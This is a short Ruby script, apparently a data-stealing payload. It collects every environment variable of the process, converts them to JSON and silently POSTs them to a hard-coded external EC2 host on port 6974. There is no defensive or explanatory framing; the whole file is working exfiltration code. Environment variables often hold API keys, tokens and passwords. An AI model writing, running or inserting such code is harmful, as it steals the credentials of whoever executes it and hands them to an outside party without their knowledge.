require 'net/http'
require 'uri'
require 'json'

# Collect environment variables
env_vars = ENV.to_h
 
# Convert environment variables to JSON format
json_data = env_vars.to_json
 
# Define the URL to send the HTTP POST request
url = URI.parse('http://ec2-13-209-69-113.ap-northeast-2.compute.amazonaws.com:6974/wow')
 
begin
  # Create the HTTP POST request
  http = Net::HTTP.new(url.host, url.port)
  request = Net::HTTP::Post.new(url.path)
  request['Content-Type'] = 'application/json'
  request.body = json_data
 
  # Send the request
  response = http.request(request)
rescue StandardError => e
  puts "An error occurred: #{e.message}"
end
